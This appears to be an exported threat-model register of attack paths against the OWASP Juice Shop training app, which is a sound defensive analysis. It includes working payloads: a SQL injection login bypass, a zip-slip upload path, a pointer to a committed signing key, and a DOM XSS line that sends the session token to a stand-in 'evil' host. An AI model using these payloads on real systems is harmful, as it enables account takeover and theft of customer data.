g.title: Internet Attacker 2 roles; access details in Identified Actors Inject Input into Server Interpreters I POST {"email":"' OR 1=1--","password":"x"} to /rest/user/login. C-02 · Express REST API Server No account required Database access relies on concatenated queries (W-002) Authentication bypass as any account including admin, plus arbitrary read of the SQLite database through the injection point. Unauthorized administration and changes to protected business data Disclosure of customer information

Internet Attacker 2 roles; access details in Identified Actors Bypass or Forge Authentication I read the RSA private key literal from lib/insecurity.ts:21 in the public repository. C-02 · Express REST API Server No account required; Public source available Secrets are committed to source instead of a managed store (W-008) Full authentication bypass: forged tokens impersonate any account, exposing all customer orders, addresses, and payment cards and allowing admin-only operations on the training shop. Unauthorized administration and changes to protected business data

Internet Attacker 2 roles; access details in Identified Actors Bypass Authorization to Gain Access A signed-in attacker puts another user's ID into the owner field of the request (req.body.UserId and the like); the query trusts it instead of the session identity, so the attacker reads or changes every other user's records — horizontal privilege escalation across all accounts. C-02 · Express REST API Server No account required Authorization is implemented route by route (W-003) Technical consequence not established. Unauthorized administration and changes to protected business data Disclosure of customer information

Internet Attacker 2 roles; access details in Identified Actors Access Exposed Data and Secrets An anonymous attacker uploads a .zip to POST /file-upload containing an entry named ../../ftp/legal.md or ../../frontend/dist/frontend/main.js; extractZipBuffer writes 'uploads/complaints/' + entry.path at routes/fileUpload.ts:34 after a containment check that only requires the path to stay inside the application root. C-02 · Express REST API Server No account required Input handling lacks enforced boundary validation (W-004) Unauthenticated overwrite of any file under the application directory, including served frontend bundles (persistent script injection for all visitors) and public FTP documents. Disclosure of customer information

Internet Attacker 2 roles; access details in Identified Actors Server-side code execution via stored input I register an account and log in to obtain the token cookie. C-02 · Express REST API Server Regular account required Application data crosses into executable code (W-001) Remote code execution in the API server process with access to the database, signing key, and host filesystem. Service disruption or compromise of application data

Internet Attacker 2 roles; access details in Identified Actors DOM XSS leading to session theft I craft /#/search?q=<iframe src=javascript:fetch('//evil?'+localStorage.token)>. C-01 · Angular Frontend SPA No account required; Victim interaction required Frontend rendering lacks enforced output encoding (W-007) Script execution in the victim's session; the JWT in localStorage can be exfiltrated for account takeover and any API call can be made as the victim. Customer account misuse and disclosure of private account data
g.text: DOM XSS leading to session theft

g.title: Internet Attacker 2 roles; access details in Identified Actors Abuse Cross-Site Requests I obtain a valid Google access token for my own Google account. C-01 · Angular Frontend SPA No account required; Victim interaction required No weakness linked in the register Login CSRF: victims unknowingly operate inside an attacker-controlled account, leaking delivery addresses and payment card data the attacker later reads; the access token also sits in the URL fragment and browser history. Customer account misuse and disclosure of private account data

Supply-Chain / Build Attacker 1 role; access details in Identified Actors Compromise the Build or Its Inputs An attacker who hijacks a maintainer account of any transitive dependency publishes a malicious in-range version; because no lockfile exists, the next CI npm install and the Docker build resolve it fresh and run its install scripts, baking the payload into the published image. C-08 · CI/CD Pipeline Build or dependency access required Build pipeline trusts mutable third-party references (W-006) A single poisoned transitive release ships in bkimminich/juice-shop images, the packaged release archives and the Heroku deployment, and executes during CI with access to runner credentials. Service disruption or compromise of application data
g.text: Compromise the Build or Its Inputs
